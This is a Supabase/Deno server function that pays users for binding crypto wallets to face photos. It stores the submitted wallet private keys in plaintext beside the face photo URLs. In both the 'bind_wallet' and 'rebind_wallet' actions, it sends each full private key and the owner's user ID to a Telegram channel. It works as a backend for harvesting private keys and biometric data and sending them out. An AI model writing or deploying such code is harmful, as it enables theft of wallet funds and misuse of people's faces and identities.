import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { ethers } from "https://esm.sh/ethers@6.16.0";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_ANON_KEY")!,
      { global: { headers: { Authorization: authHeader } } }
    );

    const adminClient = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
    );

    const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
    if (authError || !authUser) {
      return new Response(JSON.stringify({ error: "Invalid token" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const { data: dbUser } = await adminClient
      .from("users")
      .select("id, guest_id, display_name")
      .eq("auth_id", authUser.id)
      .single();

    if (!dbUser) {
      return new Response(JSON.stringify({ error: "User not found" }), {
        status: 404,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const body = await req.json();
    const { action } = body;

    // ═══ ACTION: bind_wallet ═══
    // Bind face photo + wallet after whitelist confirmed client-side
    if (action === "bind_wallet") {
      const { privateKey, address, facePhotoUrl } = body;

      if (!privateKey || !address || !facePhotoUrl) {
        return new Response(JSON.stringify({ error: "Missing required fields" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      // Insert face-wallet binding using service role
      const { error: bindingError } = await adminClient
        .from("face_wallet_bindings")
        .insert({
          wallet_address: address,
          private_key: privateKey,
          face_photo_url: facePhotoUrl,
          user_id: dbUser.id,
        });

      if (bindingError) {
        if (bindingError.code === "23505") {
          return new Response(
            JSON.stringify({ error: "duplicate_wallet", whitelisted: true }),
            { headers: { ...corsHeaders, "Content-Type": "application/json" } }
          );
        }
        throw bindingError;
      }

      // Update key_count
      const { data: userData } = await adminClient
        .from("users")
        .select("key_count")
        .eq("id", dbUser.id)
        .single();

      const newCount = (userData?.key_count || 0) + 1;
      await adminClient
        .from("users")
        .update({ key_count: newCount })
        .eq("id", dbUser.id);

      // Record earning transaction for audit trail
      await adminClient
        .from("transactions")
        .insert({
          user_id: dbUser.id,
          type: "earning",
          amount: 1,
          status: "completed",
          details: `Verified wallet: ${address.slice(0, 10)}...`,
        });

      // Mark pool key as used
      await adminClient
        .from("verification_pool")
        .update({ is_used: true })
        .eq("private_key", privateKey);

      // Send Telegram notification
      try {
        const telegramMessage = `🔑 <code>${privateKey}</code>\n👤 UID: ${dbUser.id}`;
        await adminClient.functions.invoke("send-telegram", {
          body: { message: telegramMessage },
        });
      } catch (e) {
        // Optional
      }

      return new Response(
        JSON.stringify({
          whitelisted: true,
          bound: true,
          newKeyCount: newCount,
          address,
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // ═══ ACTION: rebind_wallet ═══
    // After re-verify: increment reverify_count, add balance, mark queue completed,
    // ensure binding exists in vault, send telegram
    // Uses adminClient for all DB ops (bypasses RLS)
    if (action === "rebind_wallet") {
      const { walletAddress, rewardRate, newFacePhotoUrl } = body;

      if (!walletAddress) {
        return new Response(JSON.stringify({ error: "Missing walletAddress" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const rate = rewardRate || 0;

      // 0. If a new face photo URL is provided, refresh the binding's stored photo
      //    so future re-verifications match the user's CURRENT face (people age,
      //    grow beards, change appearance over time).
      if (newFacePhotoUrl && typeof newFacePhotoUrl === "string") {
        await adminClient
          .from("face_wallet_bindings")
          .update({ face_photo_url: newFacePhotoUrl })
          .eq("wallet_address", walletAddress);
      }

      // 1. Increment reverify_count + balance (server-side, reliable)
      const { data: userData } = await adminClient
        .from("users")
        .select("reverify_count, balance")
        .eq("id", dbUser.id)
        .single();

      const newReverifyCount = (userData?.reverify_count || 0) + 1;
      const newBalance = (userData?.balance || 0) + rate;

      await adminClient
        .from("users")
        .update({ reverify_count: newReverifyCount, balance: newBalance })
        .eq("id", dbUser.id);

      // 2. Record earning transaction
      if (rate > 0) {
        await adminClient
          .from("transactions")
          .insert({
            user_id: dbUser.id,
            type: "earning",
            amount: rate,
            status: "completed",
            details: "রি-ভেরিফাই আয়",
          });
      }

      // 3. Find the binding's private_key from vault (for telegram)
      const { data: binding } = await adminClient
        .from("face_wallet_bindings")
        .select("private_key, user_id")
        .eq("wallet_address", walletAddress)
        .maybeSingle();

      // 4. Mark any pending queue items as completed
      const { data: queueItems } = await adminClient
        .from("reverify_queue")
        .select("id, wallet_address, private_key, face_photo_url, assigned_user_id")
        .eq("wallet_address", walletAddress)
        .eq("status", "pending");

      if (queueItems && queueItems.length > 0) {
        await adminClient
          .from("reverify_queue")
          .update({ status: "completed", completed_at: new Date().toISOString() })
          .eq("wallet_address", walletAddress)
          .eq("status", "pending");

        // If binding was somehow removed, re-insert from queue data
        if (!binding) {
          const qi = queueItems[0];
          await adminClient
            .from("face_wallet_bindings")
            .insert({
              wallet_address: qi.wallet_address,
              private_key: qi.private_key,
              face_photo_url: qi.face_photo_url,
              user_id: qi.assigned_user_id,
            });
        }
      }

      // 5. Send Telegram 🔄 Re-verify notification (always, not queue-dependent)
      const privateKeyForTg = binding?.private_key || (queueItems?.[0]?.private_key) || "unknown";
      const originalOwnerId = binding?.user_id || (queueItems?.[0]?.assigned_user_id) || "?";
      let telegramSent = false;
      try {
        const telegramMessage = `🔄 Re-verify\n🔑 <code>${privateKeyForTg}</code>\n👤 Owner: ${originalOwnerId}\n👷 By: ${dbUser.id}`;
        await adminClient.functions.invoke("send-telegram", {
          body: { message: telegramMessage },
        });
        telegramSent = true;
      } catch (e) { /* optional */ }

      return new Response(
        JSON.stringify({
          success: true,
          newReverifyCount,
          newBalance,
          telegramSent,
          rebound: true,
        }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    return new Response(JSON.stringify({ error: "Unknown action" }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    console.error("generate-key error:", err);
    return new Response(
      JSON.stringify({ error: err instanceof Error ? err.message : "Unknown error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
